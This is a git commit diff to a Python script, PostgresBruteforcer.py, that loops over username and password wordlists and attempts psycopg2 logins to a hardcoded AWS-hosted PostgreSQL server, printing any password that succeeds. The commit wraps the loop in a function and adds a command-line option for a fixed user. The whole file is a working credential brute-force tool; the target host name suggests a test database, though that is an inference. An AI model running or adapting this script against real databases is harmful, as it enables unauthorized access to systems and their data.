ef4726b54c7d0b27f9962d1b28f973a4e5b5f72c
Matias Sequeira <matiassequeira@gmail.com>
2020-10-14 13:02:08 -0400

    push

--- PostgresBruteforcer.py
+++ PostgresBruteforcer.py
@@ -5,31 +5,42 @@ host='postgre-db-test.c8ur2wv0ivpl.us-east-1.rds.amazonaws.com'
 users_file='users.txt'
 passwords_file='passwords.txt'
 
-user_list= open(f'{users_file}',"r")
-password_list= open(f'{passwords_file}',"r")
+def bruteforce(user):
+    user_list= [user] if user else open(f'{users_file}',"r")
+    password_list= open(f'{passwords_file}',"r")
 
-start = time.time()
+    start = time.time()
 
-current_user='postgres'
+    iterations=0
+    for current_user in user_list:
+        print(f'Testing user: {current_user}')
+        for current_password in password_list:
+            # print(f'Testing password: {current_password}')
+            try:
+                engine = psycopg2.connect(
+                    database="postgres",
+                    user=current_user,
+                    password=current_password,
+                    host=host,
+                    port='5432'
+                )
+            except Exception as e:
+                continue
+            iterations+=1
+            
+            print(f'Found: {current_password}')
 
-print(f'Testing user: {current_user}')
-# for current_user in user_list:
-for current_password in password_list:
+    elapsed = (time.time() - start)
+    print(f'\nTotal bruteforcing time: {elapsed} for {iterations} trials')
+    print(f'\nMean bruteforcing time: {elapsed/iterations}')
 
-    print(f'Testing password: {current_password}')
-
-    try:
-        engine = psycopg2.connect(
-            database="postgres",
-            user=current_user,
-            password=current_password,
-            host=host,
-            port='5432'
-        )
-    except Exception as e:
-        continue
+if __name__ == '__main__':
     
-    print(f'Found: {current_password}')
+    parser = argparse.ArgumentParser(description='Bruteforcer')
+    parser.add_argument('-u','--user',
+                        help="Fixed user to test",
+                        default=None
+                        )
+    options= parser.parse_args()       
 
-elapsed = (time.time() - start)
-print(f'\nBruteforcing time: {elapsed}')
+    bruteforce(options.user)
